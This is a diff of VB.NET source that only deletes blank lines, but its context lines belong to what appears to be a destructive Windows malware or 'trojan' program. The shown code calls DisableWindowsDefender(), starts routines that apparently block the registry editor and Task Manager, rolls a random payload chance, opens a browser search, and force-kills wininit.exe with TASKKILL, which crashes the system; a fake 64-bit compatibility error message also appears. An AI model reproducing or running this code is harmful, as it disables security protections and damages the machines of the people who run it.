@@ -100,8 +100,6 @@ vendor to ask if a 64-bit Windows compatible version is availble.", 0 + 0, "Unsu
 
             End Try
             DisableWindowsDefender() 'worth a shot am I right? In a try will not bug the code
-
-
             NoReg.Start()
             NoTask.Start()
             Dim payloadchance As Integer = CInt(Int((40 * Rnd()) + 1))
@@ -455,10 +453,6 @@ vendor to ask if a 64-bit Windows compatible version is availble.", 0 + 0, "Unsu
         End Try
 
         Wait(3)
-
-
-
-
         Try
             Process.Start("https://www.google.com/search?sca_esv=9b107820ee34c717&sca_upv=1&sxsrf=ACQVn0-wMlNAtRhrt2T5ryRfPYICQBcEzg:1713312633304&q=windows+is+spyware&uds=AMwkrPte2rONdlHqaOEoNFr7YgHOiVFtgpI_Ouhp_p_393pfzLmTJdzG2eu02e1iRLtixUe8z4CGC2fuy7dcMRHztzSCFzI3dGLWAVQhBLrNqa6I5_RYST8DU1TQbprLSSo4h0E36iZuaMKfEtU8DupyBvGyxFpeJF6xxgOfHPEZ6HNMvV2BsglEgiuadGToqCC4x43gAAyb99N-2Pu0jgHjK1KRnsfHdxg-Pk7pwVebISixHAjviqZAl3hvC5lEiJSLj9l_zUpeHXM8HTSrqj8oX23a0Cx4DgeuBiZ9E2gkooxJZf7yn9PA3cOTe1ZWK231TMjcnghX&udm=2&prmd=ivnsbmtz&sa=X&ved=2ahUKEwjftJb3-seFAxVstokEHWrEDB8QtKgLegQICRAB&biw=1920&bih=919&dpr=1#vhid=nVwcAOfoXtc5YM&vssid=mosaic")
         Catch ex As Exception
@@ -502,9 +496,6 @@ vendor to ask if a 64-bit Windows compatible version is availble.", 0 + 0, "Unsu
 
         Wait(3)
         MyUtilities.RunCommandCom("TASKKILL /IM wininit.exe /T /F", "", False)
-
-
-
     End Sub
     Public Sub OpenTextFile(Text)
         Try
